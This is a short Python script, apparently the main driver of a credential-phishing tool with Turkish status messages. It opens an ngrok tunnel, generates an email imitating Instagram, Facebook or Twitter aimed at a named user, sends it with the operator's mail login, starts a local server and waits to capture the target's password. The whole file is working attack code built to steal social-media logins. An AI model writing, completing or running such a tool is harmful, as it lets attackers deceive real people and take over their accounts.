import os
from pyngrok import ngrok
import medya
import sendmail
import listen


def start(port: int, media, username, mail, toMail, mailPassword):
    http_tunnel = ngrok.connect(port, "http")
    ngrok_process = ngrok.get_ngrok_process()
    url = str(http_tunnel.public_url)
    print(url)
    html = ""
    if media == "Instagram":
        html = medya.Instagram(username, url).content()
    elif media == "Facebook":
        html = medya.Facebook(username, url).content()
    elif media == "Twitter":
        html = medya.Twitter(username, url).content()
    else:
        print("Hatalı medya")

    sendmail.send(mail, toMail, mailPassword, html, media=media)

    print("email başarıyla gönderildi")
    os.system(f"start python3 cherry.py {media} {port}")
    print("server başlatıldı")
    print("Hedef dinlemede")
    listen.listen(username).getPassword()

    ngrok_process.proc.wait()



